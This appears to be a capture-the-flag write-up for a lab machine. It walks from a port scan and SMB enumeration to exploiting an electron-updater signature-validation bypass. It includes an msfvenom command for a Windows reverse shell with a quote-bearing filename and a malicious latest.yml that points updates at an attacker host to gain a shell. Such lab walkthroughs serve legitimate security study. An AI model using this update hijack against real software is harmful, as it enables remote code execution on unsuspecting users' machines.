Found these ports :
Host: 10.10.10.237 

* 80 / open / tcp /  / http /  / Apache httpd 2.4.46 ((Win64) OpenSSL|1.1.1j PHP|7.3.27) / 
* 135 / open / tcp /  / msrpc /  / Microsoft Windows RPC / 
* 443 / open / tcp /  / ssl|http /  / Apache httpd 2.4.46 ((Win64) OpenSSL|1.1.1j PHP|7.3.27) / , 
* 445 / open / tcp /  / microsoft-ds /  / Windows 10 Pro 
* 19042 microsoft-ds (workgroup: WORKGROUP) / 
* 5985 / open / tcp /  / http /  / Microsoft HTTPAPI httpd 2.0 (SSDP|UPnP) 
* 6379 / open / tcp /  / redis /  / Redis key-value store

Port 445 is SMB, we connect using `smbclient`
`smbclient -L \\\\10.10.10.237\\`
We have a list of services :
![Pasted image 20210706175629.png|500](/assets/Pasted%20image%2020210706175629.png%7C500)
We connect to the service `Software_Updates`, we find directories and a pdf, we download the PDF. "UAT_Testing_Procedures.pdf"


We see that they are using electron-builder to build their apps. We google about it, and we find this [blogpost](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html) which explains the vulnerability.

We have to provide a `latest.yml` to trigger the update, and use a malicious file with a quote `'` in the filename to bypass signature validation.

We compile a reverse shell using msfvenom, this will be our malicious update.
`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > r\'evshell.exe`
And our `latest.yml`

```yml
version: 1.1.2
files:
  url: http://10.10.15.1/r'evshell.exe
  sha512: jnn1I3GMG4YfeWQqC6iHz+LJRUBVZS/3C9pc++s1b8i0cS8lM+Dp14h4G33/sh62VelWi5y7aCyphkXDR+XnHg==

path: http://10.10.15.1/r'evshell.exe
sha512: jnn1I3GMG4YfeWQqC6iHz+LJRUBVZS/3C9pc++s1b8i0cS8lM+Dp14h4G33/sh62VelWi5y7aCyphkXDR+XnHg==
```

We upload the file to the client folder with our SMB access, setup a netcat listener, HTTP server with Python and wait a while for the update to trigger.

We get a shell, and we are user `jason` got to Desktop to get user flag.